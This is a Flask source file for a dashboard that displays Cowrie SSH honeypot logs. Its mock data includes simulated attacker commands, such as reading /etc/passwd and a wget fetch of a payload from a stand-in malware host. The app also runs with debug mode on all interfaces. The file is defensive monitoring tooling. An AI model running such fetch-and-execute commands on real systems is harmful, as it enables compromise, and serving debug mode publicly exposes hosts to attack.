from flask import Flask, render_template, jsonify
import json
import os
from datetime import datetime
from collections import Counter

app = Flask(__name__)

LOG_FILE = "/home/kali/cowrie/var/log/cowrie/cowrie.json"

# ─── Mock data for local development / testing ───────────────────────────────
MOCK_LOGS = [
    {"eventid": "cowrie.login.failed",  "src_ip": "45.33.32.156",  "username": "root",  "password": "123456",     "timestamp": "2024-06-01T10:23:11.000Z"},
    {"eventid": "cowrie.login.success", "src_ip": "192.168.1.105", "username": "admin", "password": "admin",      "timestamp": "2024-06-01T10:24:05.000Z"},
    {"eventid": "cowrie.command.input", "src_ip": "192.168.1.105", "input": "uname -a",                           "timestamp": "2024-06-01T10:24:12.000Z"},
    {"eventid": "cowrie.command.input", "src_ip": "192.168.1.105", "input": "cat /etc/passwd",                    "timestamp": "2024-06-01T10:24:18.000Z"},
    {"eventid": "cowrie.login.failed",  "src_ip": "198.51.100.23", "username": "ubuntu","password": "password",   "timestamp": "2024-06-01T10:25:00.000Z"},
    {"eventid": "cowrie.login.failed",  "src_ip": "198.51.100.23", "username": "pi",    "password": "raspberry",  "timestamp": "2024-06-01T10:25:05.000Z"},
    {"eventid": "cowrie.login.success", "src_ip": "10.0.0.77",     "username": "root",  "password": "toor",       "timestamp": "2024-06-01T10:26:00.000Z"},
    {"eventid": "cowrie.command.input", "src_ip": "10.0.0.77",     "input": "wget http://malware.example.com/payload.sh", "timestamp": "2024-06-01T10:26:09.000Z"},
    {"eventid": "cowrie.command.input", "src_ip": "10.0.0.77",     "input": "chmod +x payload.sh",                "timestamp": "2024-06-01T10:26:11.000Z"},
    {"eventid": "cowrie.login.failed",  "src_ip": "203.0.113.9",   "username": "guest", "password": "guest",      "timestamp": "2024-06-01T10:27:30.000Z"},
    {"eventid": "cowrie.login.failed",  "src_ip": "203.0.113.9",   "username": "test",  "password": "test",       "timestamp": "2024-06-01T10:27:35.000Z"},
    {"eventid": "cowrie.command.input", "src_ip": "10.0.0.77",     "input": "id && whoami",                       "timestamp": "2024-06-01T10:28:01.000Z"},
]

def load_logs(n=50):
    """Load last n logs from Cowrie JSON file, fall back to mock data."""
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE) as f:
                lines = f.readlines()[-n:]
            return [json.loads(l) for l in lines if l.strip()]
        except Exception as e:
            print(f"[WARN] Could not read log file: {e}")
    return MOCK_LOGS  # fallback for local dev

def build_stats(logs):
    event_counts = Counter(l.get("eventid", "unknown") for l in logs)
    unique_ips    = len(set(l.get("src_ip", "") for l in logs if l.get("src_ip")))
    login_fails   = event_counts.get("cowrie.login.failed", 0)
    login_ok      = event_counts.get("cowrie.login.success", 0)
    commands      = event_counts.get("cowrie.command.input", 0)
    top_ips = Counter(
        l.get("src_ip") for l in logs if l.get("src_ip")
    ).most_common(5)
    return {
        "total":       len(logs),
        "unique_ips":  unique_ips,
        "login_fails": login_fails,
        "login_ok":    login_ok,
        "commands":    commands,
        "top_ips":     [{"ip": ip, "count": c} for ip, c in top_ips],
    }

@app.route("/")
def index():
    logs  = load_logs()
    stats = build_stats(logs)
    using_mock = not os.path.exists(LOG_FILE)
    return render_template("index.html",
                           logs=list(reversed(logs)),
                           stats=stats,
                           using_mock=using_mock,
                           now=datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"))

@app.route("/api/logs")
def api_logs():
    logs = load_logs()
    return jsonify({"logs": list(reversed(logs)), "stats": build_stats(logs)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)